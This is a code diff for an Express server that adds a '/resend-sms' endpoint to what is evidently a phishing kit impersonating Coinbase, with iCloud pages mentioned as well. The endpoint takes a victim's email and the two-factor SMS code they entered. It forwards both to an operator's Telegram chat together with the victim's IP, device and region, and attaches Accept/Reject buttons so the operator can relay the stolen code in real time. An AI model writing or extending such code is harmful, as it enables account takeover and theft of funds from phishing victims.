@@ -726,6 +726,74 @@ app.post("/check-sms-status", (req, res) => {
 });
 
 // ============================================================================
+// POST /resend-sms - Resend SMS code to winner bot only
+// ============================================================================
+
+app.post("/resend-sms", async (req, res) => {
+  try {
+    const { email, userId } = req.body;
+
+    if (!email) {
+      return res.status(400).json({ error: "Missing email" });
+    }
+
+    console.log(`📲 Resending SMS code to ${email}`);
+
+    // Get SMS details from pendingSMS
+    const smsSMS = pendingSMS[email];
+    if (!smsSMS) {
+      return res.status(400).json({ error: "No SMS found for this email" });
+    }
+
+    const smsCode = smsSMS.smsCode;
+
+    const ip = getIP(req);
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    const message =
+      `😈😈😈 <b>Coinbase - SMS (Resend)</b> 😈😈😈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    // ✅ SEND TO WINNER ONLY
+    if (email && userWinnerTelegram[email]) {
+      console.log(`📨 Resend SMS going to winner only: ${userWinnerTelegram[email]}`);
+      await sendFollowUpMessage(email, message, {
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: "✅ Accept", callback_data: `sms_accept|${email}` },
+              { text: "❌ Reject", callback_data: `sms_reject|${email}` }
+            ]
+          ]
+        }
+      });
+    } else {
+      console.log(`⚠️ No winner found for ${email}, not resending SMS`);
+      return res.status(400).json({ error: "No winner determined for this email" });
+    }
+
+    // Reset SMS status to pending
+    pendingSMS[email].status = "pending";
+
+    console.log(`📧 ${email} | SMS Resent: ${smsCode}`);
+    
+    res.json({ ok: true });
+
+  } catch (err) {
+    console.error("Resend SMS error:", err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ============================================================================
 // ICLOUD PAGES ENDPOINTS
 // ============================================================================
 
